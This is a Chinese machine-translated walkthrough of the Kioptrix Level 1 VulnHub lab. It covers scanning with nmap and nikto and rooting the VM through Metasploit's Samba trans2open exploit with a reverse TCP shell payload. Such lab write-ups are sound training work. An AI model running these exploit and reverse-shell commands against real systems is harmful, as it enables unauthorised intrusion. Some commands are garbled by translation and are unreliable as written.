<html>
<head>
<title>Kioptrix: Level 1 [Vulnhub] Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">kioptrix:1级[Vulnhub]演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/kioptrix-level-1-vulnhub-walkthrough-49bcc7306e72?source=collection_archive---------0-----------------------#2021-03-10">https://infosecwriteups.com/kioptrix-level-1-vulnhub-walkthrough-49bcc7306e72?source=collection_archive---------0-----------------------#2021-03-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/9dfb5a70e0e42e8e67011dd3b7fcd24a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oWMF_MkRygQnrbdi_k6Q6A.jpeg"/></div></div></figure><p id="7b65" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Kioptrix是一个引导到根的挑战，你可以从<a class="ae kw" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" rel="noopener ugc nofollow" target="_blank"> Vulnhub </a>下载。您可以下载并安装在您的虚拟机上。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/569987be2ccc0253c9f91b47b16fe56b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ENRn1Sf2xbDMVN7s0oA_7w.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图1 -Kioptrix登录</figcaption></figure><p id="7c53" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">描述</strong></p><blockquote class="lg lh li"><p id="d535" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">这个Kioptrix虚拟机映像是简单的挑战。游戏的目标是通过任何可能的手段获得根用户权限(除了真正入侵VM服务器或玩家)。这些游戏的目的是学习脆弱性评估和利用的基本工具和技术。成功完成挑战的方法不止一种。</p></blockquote><p id="5929" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">方法论</strong></p><ul class=""><li id="bcf1" class="ln lo iq ka b kb kc kf kg kj lp kn lq kr lr kv ls lt lu lv bi translated">网络扫描</li><li id="05c5" class="ln lo iq ka b kb lw kf lx kj ly kn lz kr ma kv ls lt lu lv bi translated">列举</li><li id="e081" class="ln lo iq ka b kb lw kf lx kj ly kn lz kr ma kv ls lt lu lv bi translated">剥削</li><li id="47b0" class="ln lo iq ka b kb lw kf lx kj ly kn lz kr ma kv ls lt lu lv bi translated">获得root访问权限</li></ul><p id="5abf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">用过的工具</strong></p><ul class=""><li id="1681" class="ln lo iq ka b kb kc kf kg kj lp kn lq kr lr kv ls lt lu lv bi translated">Nmap</li><li id="b705" class="ln lo iq ka b kb lw kf lx kj ly kn lz kr ma kv ls lt lu lv bi translated">尼克托</li><li id="7815" class="ln lo iq ka b kb lw kf lx kj ly kn lz kr ma kv ls lt lu lv bi translated">Metasploit</li></ul><p id="0fad" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">那么，我们开始吧。</p><p id="3c45" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">打开攻击机器(Kioptrix 1.0虚拟机)并扫描本地网络以获取受害者的IP地址。为此，您可以使用<strong class="ka ir"> netdiscover </strong>命令。</p><blockquote class="lg lh li"><p id="d138" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">sudo网络探索</p></blockquote><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mb"><img src="../Images/0ea854ccbd26e812199a8d6f0f678e0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U-RFqO257sI6ZZ06PYCZig.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图2-网络发现</figcaption></figure><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mc"><img src="../Images/bc961c94efc07eccfafc17ae62306e2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HClrkBOeNhRBQn3Ud0WTNQ.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图3-网络发现结果</figcaption></figure><p id="d83b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">获得目标的IP地址后，我们将枚举目标的开放端口和协议。为此，我使用了Nmap主动命令。请考虑您的目标IP地址可能与我的不同。</p><ul class=""><li id="f544" class="ln lo iq ka b kb kc kf kg kj lp kn lq kr lr kv ls lt lu lv bi translated">这是我的nmap结果，但这可能与你的略有不同，因为我已经为我的机器安装了Nmap脚本。</li></ul><blockquote class="lg lh li"><p id="d717" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">nmap-A 192 . 168 . 1 . 14-开结果. txt</p></blockquote><ul class=""><li id="26e1" class="ln lo iq ka b kb kc kf kg kj lp kn lq kr lr kv ls lt lu lv bi translated">开-将输出保存到文件中</li></ul><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi md"><img src="../Images/af013cd96493949ae4549450df2ca415.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P13bMXBr0vKq5d-_3omBZQ.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图4-Nmap扫描</figcaption></figure><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/15b3b7257299ede855a1f49407d58e17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fgtBhZ8m3RopnkmDHRorLw.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图5-端口80打开</figcaption></figure><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/25ae3b5796d393a861874a824da78c65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PghaNTfpsA4rHPUs7Vqraw.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图6-端口443打开</figcaption></figure><p id="a302" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为端口80是开放的，并且正在运行apache服务。所以，我试着去看看。但这只是一个测试页面。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/c1803e120af514d2cf9bdeff8d4b6ef8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GSBBL-oyXe3GDs2YhiAmDg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图7-网页</figcaption></figure><p id="d766" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后我查看了页面源代码以获得更多信息。但是它没有给出太多信息。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/6abe6959bc8ed4575a189fe90e7381c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xOYnO-LAh-4JeBagsvEGfQ.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图8-查看页面源代码</figcaption></figure><p id="84ba" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后我在下面命令的帮助下使用了<strong class="ka ir"> nikto </strong>漏洞扫描。</p><blockquote class="lg lh li"><p id="f360" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">nikto-h<a class="ae kw" href="http://hTTP://192.168.1.14" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 1 . 14</a>/</p></blockquote><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/b31c09e0fa00fa6378393b811f13e94a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4GIKZP3mga633UheoyHGEA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图9 -Nikto扫描</figcaption></figure><p id="544c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">由于有了上述枚举的帮助，很明显实验室可以利用多个，因此我们不浪费时间，在Metasploit的帮助下执行以下命令，并尝试组成目标的虚拟机。</p><p id="51fb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这利用了Samba版本2.2.0到2.2.8中的缓冲区溢出。该特定模块能够利用未设置noexec堆栈选项的x86 Linux系统上的缺陷。注意:RedHat的一些旧版本似乎不容易受到攻击，因为它们显然不允许匿名访问IPC。</p><p id="8e0c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我使用Metasploit来利用这个漏洞。</p><p id="8138" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">要启动Metasploit DB，我们可以使用以下命令。</p><blockquote class="lg lh li"><p id="5eb6" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">sudo msfdb初始化</p><p id="b678" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">msfconsole</p></blockquote><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mi"><img src="../Images/49bf3b762440e332d2af0ad6603f3001.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clrryJFJZ-bZgwq3myhZBg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图10-启动msfconsole</figcaption></figure><p id="6d6d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后，我们搜索漏洞并配置利用选项。</p><blockquote class="lg lh li"><p id="9d32" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">搜索trans2open</p></blockquote><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/38d7290ddfd3112d0a5fe5f34a46a086.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uGV8jiy-wJgJQlD0272D4A.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图11-搜索模块</figcaption></figure><blockquote class="lg lh li"><p id="d4c9" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">使用exploit/linux/samba/trans2open</p></blockquote><p id="9f36" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以使用<strong class="ka ir">选项</strong>命令来查看选项。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/21ab465bae0c578bc634f5bb1787dd16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GmggA3F47WLIQIgr1X6fDA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图12-选项</figcaption></figure><p id="2aef" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后配置远程主机(RHOST)、本地主机(lhost)和有效负载。这里我们使用reverse_tcp shell来提升特权。</p><blockquote class="lg lh li"><p id="ed21" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">MSF exploit(Linux/samba/trans 2 open)&gt; set rhost 192 . 168 . 1 . 14</p><p id="bf25" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">MSF exploit(Linux/samba/trans 2 open)&gt;设置有效负载linux/x86/shell_reverse_tcp</p><p id="bdb8" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">msf漏洞利用(linux/samba/trans2open)&gt;设置lhost 192.168.1.15</p><p id="28a4" class="jy jz lj ka b kb kc kd ke kf kg kh ki lk kk kl km ll ko kp kq lm ks kt ku kv ij bi translated">msf漏洞利用(linux/samba/trans2open)&gt;漏洞利用</p></blockquote><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/033fdb730860ab847ea1837393748dba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sxWwtjjuSwhtaisNpZjk9g.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">图14 —开发</figcaption></figure><p id="7be7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Booom！！这里我们有一个受害者机器的命令外壳，具有根用户权限。</p><p id="7cd4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我认为你从这篇文章中学到了一些东西。那么，我们就在下一篇文章里见面吧。黑客快乐！😊</p></div></div>    
</body>
</html>